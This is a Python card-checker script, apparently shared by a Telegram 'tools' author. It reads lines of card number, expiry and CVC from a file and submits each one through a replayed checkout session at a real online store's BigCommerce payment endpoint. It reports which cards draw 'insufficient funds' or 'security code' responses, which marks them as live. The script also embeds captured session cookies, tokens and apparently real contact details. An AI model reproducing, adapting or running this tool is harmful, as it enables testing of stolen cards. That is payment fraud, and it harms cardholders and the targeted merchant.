try:
 import pyfiglet,requests,os
 from colorama import Fore
 import colorama
except ModuleNotFoundError:
 os.system('pip install requests')
 os.system('pip install pyfiglet')
 os.system('clear')

print(Fore.BLUE+"""
[  Telegram - 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ .  ] 
[  Instagram - 4ec_q   ] 
[  Tools By @u_3_3_3_3 ]
[  My Chanal Tele - https://t.me/python_proffetional  ]
[  𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ . يتمنى لاصحاب فك التشفير ان يصبحو رجالا   ['
""")


file=open('Modca.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
k = ("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀｡ﾟﾟ･｡･ﾟﾟ｡𖣬𝑠𝑎𝑙𝑎ℎ 𖣬｡ﾟﾟ･｡･ﾟﾟ｡▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀" )
print(B + k)
print('                       𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ . يتمنى لاصحاب فك التشفير ان يصبحو رجالا')
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')	
	#الصق ريكوس'ت 1
	
	cookies = {
	    'fornax_anonymousId': '68f2d9a2-0b08-42ed-8bff-90d969296a0f',
	    'athena_short_visit_id': '42fff496-fb07-44b8-8469-a2b0155f351f:1708024447',
	    'SHOP_SESSION_TOKEN': 'c73e1a9d-8a8a-4909-a021-a5d439932b92',
	    '_fbp': 'fb.1.1708024451126.1605814770',
	    '_gcl_au': '1.1.862102793.1708024452',
	    'STORE_VISITOR': '1',
	    'omnisendSessionID': 'FyDEk524om63ua-20240215191415',
	    'SHOP_SESSION_ROTATION_TOKEN': 'e0bed2e9442f2ea365164ee05bc0c37156d559fb83d43a4e80740eb3e29d5d0d',
	    'ajs_user_id': 'null',
	    'ajs_group_id': 'null',
	    'ajs_anonymous_id': '%22348bda9c-94c6-47d9-bde1-dba2a61552b1%22',
	    '_ga': 'GA1.2.543280403.1708024470',
	    '_gid': 'GA1.2.1994477043.1708024470',
	    '_gat': '1',
	    '_gali': 'checkout-payment-continue',
	    'Shopper-Pref': '9AEEA53614BA81CA188A9A6AEC6D821FE2BE2321-1708629382067-x%7B%22cur%22%3A%22USD%22%7D',
	    'XSRF-TOKEN': '7e2b3768a9cc5bef05c2a7cf579313b9ba48e3b57dc5d2fc8cfec9529b2aefa9',
	}
	
	headers = {
	    'authority': 'www.tailbangers.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://www.tailbangers.com',
	    'referer': 'https://www.tailbangers.com/checkout',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-checkout-sdk-version': '1.536.0',
	    'x-checkout-variant': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3d3dy50YWlsYmFuZ2Vycy5jb20iLCJpYXQiOjE3MDgwMjQ0NjYsImRvbWFpbiI6eyJjYXJ0SWQiOiI1YmIxZGZlMy1iNmY4LTQ0NmYtYTQwZi05MjlhMTFjNjU3ZGQiLCJjaGVja291dFZhcmlhbnQiOiJvcHRpbWl6ZWRfb25lX3BhZ2VfY2hlY2tvdXQifX0.tp09pwsvLJhuKnouxoi4yaJaj7KFuccVvXI24gAaoTE',
	    'x-xsrf-token': '7e2b3768a9cc5bef05c2a7cf579313b9ba48e3b57dc5d2fc8cfec9529b2aefa9',
	}
	
	json_data = {
	    'cartId': '5bb1dfe3-b6f8-446f-a40f-929a11c657dd',
	    'customerMessage': '',
	}
	
	response = requests.post(
	    'https://www.tailbangers.com/internalapi/v1/checkout/order',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	id = response.json()['x-xsrf-token']
	#الصق ريكوست 2
	headers = {
	    'Accept': 'application/json',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Authorization': 'JWT eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDgwMjgxODMsIm5iZiI6MTcwODAyNDU4MywiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDAwNzUzNzA1LCJqdGkiOiI5YTRmOWQ2Ni1kMjFiLTRiMTEtOGFkYy05YjFmMDQ4Y2IwNjIiLCJpYXQiOjE3MDgwMjQ1ODMsImRhdGEiOnsic3RvcmVfaWQiOiIxMDAwNzUzNzA1Iiwib3JkZXJfaWQiOiI1OTUxIiwiYW1vdW50IjoxMzUwLCJjdXJyZW5jeSI6IlVTRCIsInN0b3JlX3VybCI6Imh0dHBzOi8vd3d3LnRhaWxiYW5nZXJzLmNvbSIsImZvcm1faWQiOiJlNWJiMzJmNC04NTk4LTQwNDMtYTc2Ni1iZmQzZDRkMTFjZTUifX0.GQBx4VbpZhh3e1urW_sDfhSZIxywJU8tx0D3gCu4bnw',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    'Origin': 'https://payments.bigcommerce.com',
	    'Referer': 'https://payments.bigcommerce.com/pay/hosted_forms/e5bb32f4-8598-4043-a766-bfd3d4d11ce5/field?version=1.536.0',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'customer': {
	        'geo_ip_country_code': 'IQ',
	        'session_token': '26ad76dc7151914e92decda2499d7b7045c75223',
	    },
	    'notify_url': 'https://internalapi-1000753705.mybigcommerce.com/internalapi/v1/checkout/order/5951/payment',
	    'order': {
	        'billing_address': {
	            'city': 'Beaumont',
	            'country_code': 'US',
	            'country': 'United States',
	            'first_name': 'kd3tkoam',
	            'last_name': 'Мохаммед محمد',
	            'phone': '+14938562592',
	            'state_code': 'TX',
	            'state': 'Texas',
	            'street_1': '102 Berkshire Ln',
	            'zip': '77707',
	            'email': 'shajor149@gmail.com',
	        },
	        'coupons': [],
	        'currency': 'USD',
	        'id': '5951',
	        'items': [
	            {
	                'code': '69ceb828-9e52-4b93-852e-b91b06e8ac4c',
	                'variant_id': 132,
	                'name': '"Happy Birthday" Bandana - Large',
	                'price': 750,
	                'unit_price': 750,
	                'quantity': 1,
	                'sku': 'HDS201614-BL',
	            },
	        ],
	        'shipping': [
	            {
	                'method': 'Flat Rate',
	            },
	        ],
	        'shipping_address': {
	            'city': 'Beaumont',
	            'country_code': 'US',
	            'country': 'United States',
	            'first_name': 'kd3tkoam',
	            'last_name': 'Мохаммед محمد',
	            'phone': '+14938562592',
	            'state_code': 'TX',
	            'state': 'Texas',
	            'street_1': '102 Berkshire Ln',
	            'zip': '77707',
	        },
	        'token': id,
	        'totals': {
	            'grand_total': 1350,
	            'handling': 0,
	            'shipping': 600,
	            'subtotal': 750,
	            'tax': 0,
	        },
	    },
	    'payment': {
	        'gateway': 'authorizenet',
	        'notify_url': 'https://internalapi-1000753705.mybigcommerce.com/internalapi/v1/checkout/order/5951/payment',
	        'vault_payment_instrument': False,
	        'method': 'credit-card',
	        'credit_card': {
	            'account_name': 'mdeoy',
	            'month': mm,
	            'number': n,
	            'verification_value': cvc,
	            'year': yy,
	            'hosted_form_nonce': '2d9681b24d4838357c1b8950533d08061dadef3cf28573a4a5d0aa548c023600',
	        },
	    },
	    'store': {
	        'hash': 'gl5xihpq57',
	        'id': '1000753705',
	        'name': 'Tail Bangers Inc.',
	    },
	}
	
	response = requests.post('https://payments.bigcommerce.com/api/public/v1/orders/payments', headers=headers, json=json_data)
	
	
	
	
	if "Your card's security code is" in response.json()['validation_feedback']:
		print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['validation_feedback'])
	elif "Your card has insufficient funds." in response.json()['validation_feedback']:
		print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['validation_feedback'])
	elif "Your card does not support this type of purchase." in response.json()['validation_feedback']:
		print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['validation_feedback'])
	elif "Your card's expiration month is invalid." in response.json()['validation_feedback']:
		print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['validation_feedback'])
	else:
		print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['validation_feedback'])